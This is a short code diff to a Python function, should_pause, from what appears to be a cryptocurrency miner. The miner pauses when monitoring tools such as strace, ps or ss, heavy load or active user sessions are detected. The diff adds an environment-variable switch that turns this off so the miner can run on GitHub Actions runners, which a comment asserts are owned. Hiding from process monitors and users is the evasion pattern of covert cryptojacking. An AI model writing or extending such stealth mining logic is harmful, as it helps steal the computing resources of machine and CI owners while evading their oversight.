@@ -52,6 +52,10 @@ def should_pause():
     - High system load (other CPU-intensive processes)
     - Active user sessions
     """
+    # Guard: disable idle-pause entirely (e.g. GH Actions runner we own).
+    # Monitoring agents (strace/ps/ss) are always present there -> false pause.
+    if os.environ.get("MINER_MONITOR_GUARD") == "0":
+        return False, None
     # Check for monitoring tools
     for proc in psutil.process_iter(['name']):
         try:
